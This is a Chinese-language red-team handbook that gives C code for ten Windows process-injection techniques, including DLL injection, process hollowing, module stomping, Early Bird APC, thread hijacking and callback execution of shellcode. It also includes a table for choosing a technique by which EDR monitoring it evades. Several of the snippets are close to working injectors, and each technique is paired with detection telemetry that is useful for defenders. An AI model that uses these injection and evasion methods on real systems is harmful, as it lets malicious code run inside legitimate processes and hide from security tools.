# Process Injection — 10 类注入完整 C 实现手册

> 本文件为 `evasion-comprehensive.md` §2 的伴生手册（补齐「Full C code」断链）。
> 覆盖 10 类经典进程注入的**原理 → C 实现 → 检测侧对应点 → 实测判据**四段。
> 代码为骨架示例（保守写法，标注「骨架示例」处表示需按目标版本补齐结构）。
> 授权立场与检测侧配对纪律见 `refs/README.md`。

## 0. 通用前置（所有技术共享）

```c
// 通用：目标进程句柄与内存写入原语（骨架示例）
HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);   // 高权限句柄，检测热点
// 更隐蔽：仅申请所需权限 PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_CREATE_THREAD
```

| 原语 | 函数 | 检测侧对应点 |
|---|---|---|
| 跨进程分配 | `VirtualAllocEx` / `NtAllocateVirtualMemory` | 远端内存保护属性（RWX/RX）突变 |
| 跨进程写 | `WriteProcessMemory` / `NtWriteVirtualMemory` | 跨进程写 + CallTrace 不在目标模块 |
| 线程创建 | `CreateRemoteThread` / `NtCreateThreadEx` | 4688 线程创建 + 起始地址不在已加载模块 |
| 上下文改写 | `SetThreadContext` / `GetThreadContext` | 挂起线程 RIP/RSP 被改 |

---

## 1. Classic DLL Injection（经典 DLL 注入）

**原理**：在目标进程内 `CreateRemoteThread` 调用 `LoadLibraryA`，让目标进程自己加载攻击 DLL。

```c
// 骨架示例：向目标进程注入 DLL 路径并触发 LoadLibrary
const char* dllPath = "C:\\Users\\Public\\payload.dll";
SIZE_T len = strlen(dllPath) + 1;
LPVOID remote = VirtualAllocEx(hProc, NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
WriteProcessMemory(hProc, remote, dllPath, len, NULL);
// 目标进程内 kernel32!LoadLibraryA 地址（同基址假设，x64 下需校验）
LPVOID loadLib = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)loadLib, remote, 0, NULL);
WaitForSingleObject(hThread, INFINITE);
```

**检测侧**：Sysmon 8（CreateRemoteThread）、7（ImageLoad payload.dll 来源异常）、10（进程访问）。
**实测判据**：`CreateRemoteThread` 起始地址 = `LoadLibraryA` 且参数为远端可写缓冲区路径。

---

## 2. Process Hollowing（进程镂空）

**原理**：挂起创建合法进程 → `NtUnmapViewOfSection` 卸载其映像 → 在 ImageBase 重写恶意映像 → `SetThreadContext` 改入口 → 复活。

```c
// 骨架示例：镂空流程（x64）
STARTUPINFOA si = {0}; PROCESS_INFORMATION pi = {0};
si.cb = sizeof(si);
CreateProcessA(NULL, "C:\\Windows\\System32\\svchost.exe", NULL, NULL, FALSE,
               CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

// 1) 读远端 PEB 拿 ImageBase
PROCESS_BASIC_INFORMATION pbi; ULONG retLen;
NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
ULONG_PTR imageBase = 0;
ReadProcessMemory(pi.hProcess, (LPVOID)((ULONG_PTR)pbi.PebBaseAddress + 0x10), &imageBase, sizeof(imageBase), NULL);

// 2) 卸载原映像
NtUnmapViewOfSection(pi.hProcess, (PVOID)imageBase);

// 3) 重新分配并写头 + 节区（srcImage 为恶意 PE 的映射副本）
PIMAGE_NT_HEADERS nt = /* 解析 srcImage */;
VirtualAllocEx(pi.hProcess, (LPVOID)nt->OptionalHeader.ImageBase, nt->OptionalHeader.SizeOfImage,
               MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, (LPVOID)nt->OptionalHeader.ImageBase, srcImage, nt->OptionalHeader.SizeOfHeaders, NULL);
// 逐节区写入：遍历 IMAGE_SECTION_HEADER，按 VirtualAddress 写 RawData

// 4) 改入口点
ULONG_PTR entry = nt->OptionalHeader.ImageBase + nt->OptionalHeader.AddressOfEntryPoint;
CONTEXT ctx = {0}; ctx.ContextFlags = CONTEXT_FULL;
GetThreadContext(pi.hThread, &ctx);
ctx.Rcx = entry;                                   // x64 入口参数经 rcx
ctx.Rip = entry;                                   // 新入口地址
SetThreadContext(pi.hThread, &ctx);
ResumeThread(pi.hThread);
```

**检测侧**：进程创建为挂起 + `NtUnmapViewOfSection` + 映像基址与磁盘 PE 不一致（EDR 比对）。
**实测判据**：`svchost.exe` 等系统进程的磁盘哈希 ≠ 内存哈希；入口点偏移异常。

---

## 3. Reflective DLL Injection（反射 DLL 注入）

**原理**：不落盘、不 `LoadLibrary`，自定义加载器在内存中重建 PE（节区 + 重定位 + 导入表）后调 `DllMain`。

```c
// 骨架示例：反射加载核心（见 T031 详版）
ULONG_PTR LoadRemoteImage(LPVOID base, LPVOID image) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)image;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((ULONG_PTR)image + dos->e_lfanew);
    // 1) 分配 SizeOfImage
    // 2) 拷贝 headers + 逐节区
    // 3) 重定位：delta = (ULONG_PTR)base - nt->OptionalHeader.ImageBase
    //    遍历 IMAGE_BASE_RELOCATION，对 ABS/REL64 类型加 delta
    // 4) 导入表：遍历 IMAGE_IMPORT_DESCRIPTOR，LoadLibrary + GetProcAddress 填 IAT
    // 5) 调 DllMain(base, DLL_PROCESS_ATTACH, 0)
    return (ULONG_PTR)base;
}
```

**检测侧**：内存中无磁盘映射的 PE 映像 + 自定义 loader 代码特征（sRDI/反射特征库）。
**实测判据**：`GetProcAddress` + 手动重定位循环 + 无 `LoadLibrary` 的 DllMain 调用。

---

## 4. Module Stomping（模块踩踏）

**原理**：载入合法签名 DLL → 覆写其 `.text`（或代码洞）为 shellcode，让 payload「有磁盘背书」，规避「私有可执行内存」检测。

```c
// 骨架示例：覆写合法 DLL 的 .text 前 N 字节
HMODULE h = LoadLibraryA("winhttp.dll");
PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)h;
PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((ULONG_PTR)h + dos->e_lfanew);
PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
// 找 .text 节区（比对节名）
for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
    if (memcmp(sec[i].Name, ".text", 5) == 0) {
        LPVOID target = (LPVOID)((ULONG_PTR)h + sec[i].VirtualAddress);
        DWORD old;
        VirtualProtect(target, scLen, PAGE_EXECUTE_READWRITE, &old);
        memcpy(target, shellcode, scLen);
        VirtualProtect(target, scLen, old, &old);
        FlushInstructionCache(GetCurrentProcess(), target, scLen);
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)target, NULL, 0, NULL);
        break;
    }
}
```

**检测侧**：磁盘签名 DLL 与内存 `.text` 哈希不一致（EDR 内存完整性扫描 + 已加载模块节区比对）。
**实测判据**：`winhttp.dll` 加载后 `.text` 前 N 字节 ≠ 磁盘对应字节；`FlushInstructionCache` 调用。

---

## 5. APC Injection（Early Bird / Existing）

**原理**：APC（异步过程调用）在目标线程 alertable 等待时执行。Early Bird 在挂起进程主线程**尚未运行**时投递 APC，线程恢复后入口前先执行 shellcode。

```c
// 骨架示例：Early Bird APC
CreateProcessA(NULL, "C:\\Windows\\System32\\notepad.exe", NULL, NULL, FALSE,
               CREATE_SUSPENDED, NULL, NULL, &si, &pi);
LPVOID remote = VirtualAllocEx(pi.hProcess, NULL, scLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
WriteProcessMemory(pi.hProcess, remote, shellcode, scLen, NULL);
QueueUserAPC((PAPCFUNC)remote, pi.hThread, 0);      // 主线程运行前投递
ResumeThread(pi.hThread);
```

```c
// Existing APC：对已运行线程投递（需线程处于 alertable 状态）
HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, targetTid);
QueueUserAPC((PAPCFUNC)remote, hThread, 0);
```

**检测侧**：APC 目标为未运行线程（Early Bird 特徵）+ 远端 RWX + `QueueUserAPC` 回调地址异常。
**实测判据**：挂起进程首线程 APC + `ResumeThread` 序列；回调地址不在已加载模块。

---

## 6. Thread Hijacking（线程劫持）

**原理**：挂起现有线程 → `SetThreadContext` 改 RIP 指向 shellcode → 恢复，复用现有线程（不新建线程）。

```c
// 骨架示例：劫持目标线程 RIP
HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, targetTid);
SuspendThread(hThread);
CONTEXT ctx = {0}; ctx.ContextFlags = CONTEXT_CONTROL;
GetThreadContext(hThread, &ctx);
LPVOID remote = VirtualAllocEx(hProc, NULL, scLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
WriteProcessMemory(hProc, remote, shellcode, scLen, NULL);
ctx.Rip = (DWORD64)remote;                          // x64 改 RIP
SetThreadContext(hThread, &ctx);
ResumeThread(hThread);
```

**检测侧**：已运行线程 RIP 突变为私有可执行内存（与 Threadless 同源的「线程状态突变」遥测）。
**实测判据**：`SuspendThread` + `SetThreadContext`（RIP 指向非模块地址）+ `ResumeThread`。

---

## 7. Callback Injection（回调注入）

**原理**：借系统回调 API（`EnumWindows`/`EnumFonts`/`CertEnumSystemStore` 等）把 shellcode 地址当作回调函数指针触发执行，规避 `CreateRemoteThread` 监控。

```c
// 骨架示例：回调执行（本进程或注入远端后触发）
LPVOID sc = VirtualAlloc(NULL, scLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
memcpy(sc, shellcode, scLen);
EnumWindows((WNDENUMPROC)sc, 0);                    // 回调 = shellcode 地址
```

**检测侧**：回调 API 的函数指针落在私有 RX 内存（栈回溯显示回调源不在任何模块）。
**实测判据**：`EnumWindows` 等回调地址 ∉ 已加载模块地址范围。

---

## 8. Process Doppelganging（进程双身 / NTFS 事务）

**原理**：利用 NTFS 事务（`NtCreateTransaction`）创建一个临时文件的合法映射，在事务提交前把恶意映像写入映射，用**已回滚（磁盘无此文件）但映射仍有效**的 section 创建进程。

```c
// 骨架示例：transacted 文件 + section + 进程创建
HANDLE hTx; NtCreateTransaction(&hTx, TRANSACTION_ALL_ACCESS, NULL, NULL, NULL, 0, 0, 0, 0, NULL);
// 1) 在事务内 CreateFile + 写合法 PE 头（使映射「合法」）
// 2) NtCreateSection(绑 hTx) -> NtMapViewOfSection 拿到映像映射
// 3) 覆写映射内容为恶意映像
// 4) NtCreateProcessEx 用该 section 创建进程
// 5) NtRollbackTransaction(hTx)：磁盘无痕，但进程已由 section 支撑运行
```

**检测侧**：`NtCreateTransaction` + `NtCreateSection`(事务绑定) + `NtCreateProcessEx` 罕见组合；进程映像无磁盘文件（`GetProcessImageFileName` 返回空/临时路径）。
**实测判据**：进程存活但其映像文件不可见（文件系统层面不存在）。

---

## 9. Process Herpaderping（进程文件覆写）

**原理**：创建进程后、首次读入映像前，把磁盘文件覆写为**与内存映像不同**的内容，使扫描器读到的磁盘内容 ≠ 实际执行内容。

```c
// 骨架示例：Herpaderping 流程
// 1) 写 payload 到临时文件
// 2) CreateProcess(挂起) 用该文件创建进程
// 3) 立刻用不同内容覆写该文件（进程已映射，磁盘内容与内存映像解耦）
// 4) 修改文件时间戳/内容以迷惑扫描器
// 5) ResumeThread
```

**检测侧**：进程映像文件在创建后被快速覆写（文件内容与内存映像不一致）；`NtCreateSection` + 文件覆写竞态。
**实测判据**：磁盘文件哈希 ≠ 进程内存映像哈希；文件在进程创建后短时间内被写。

---

## 10. Phantom DLL Hollowing（幻影 DLL 镂空）

**原理**：映射一个合法 DLL 的 section 到目标进程（看似加载了 DLL），随后用 shellcode 覆写其内存内容——进程内的模块列表仍显示该合法 DLL，但实际执行的是 shellcode。

```c
// 骨架示例：映射 DLL section 后覆写（与 Module Stomping 同族，跨进程版）
// 1) 打开合法 DLL 文件 -> NtCreateSection(映射)
// 2) NtMapViewOfSection 到目标进程（模块列表出现该 DLL）
// 3) WriteProcessMemory 覆写映射内容为 shellcode
// 4) 触发执行（APC/回调/线程劫持指向覆写区）
```

**检测侧**：跨进程映射的 DLL 节区内容与磁盘不符；模块列表「干净」但节区哈希异常。
**实测判据**：目标进程模块列表含 `amsi.dll` 等，但其 `.text` 前 N 字节 ≠ 磁盘。

---

## 附：注入技术选择决策表

| 场景 | 推荐技术 | 理由 |
|---|---|---|
| 快速验证 | Classic DLL / CreateRemoteThread | 简单，但高检测 |
| 规避「新线程」监控 | Thread Hijack / Threadless / Callback | 不建新线程 |
| 规避「私有可执行内存」 | Module Stomping / Phantom DLL | 有磁盘背书 |
| 规避「文件落地」 | Reflective / Doppelganging / Herpaderping | 无痕或文件-内存分离 |
| 规避「写后执行」时间窗 | Early Bird / Transacted Hollowing | 首线程执行前投递 |

## 检测侧总表（回馈 attack-defense）

| 注入技术 | 主检测点 | 遥测/Sigma |
|---|---|---|
| Classic DLL | CreateRemoteThread 起始地址=LoadLibrary | Sysmon 8 + 7 |
| Hollowing | NtUnmapViewOfSection + 映像基址异常 | 进程创建挂起 + 内存比对 |
| Reflective | 自定义 PE loader + 无磁盘映像 | sRDI 特征 + 内存扫描 |
| Module Stomping | 磁盘/内存 .text 哈希不一致 | 已加载模块节区校验 |
| APC | 首线程 APC + 回调地址异常 | Sysmon + ETW APC |
| Thread Hijack | SetThreadContext RIP 突变 | 线程状态遥测 |
| Callback | 回调指针落在私有 RX | 栈回溯回调源校验 |
| Doppelganging | 事务 section + 无文件进程 | NtCreateTransaction 遥测 |
| Herpaderping | 文件-内存映像不一致 | 文件覆写竞态检测 |
| Phantom DLL | 跨进程映射 DLL 节区覆写 | 模块节区哈希比对 |

*WARNING: 授权红队评估与安全研究专用。*
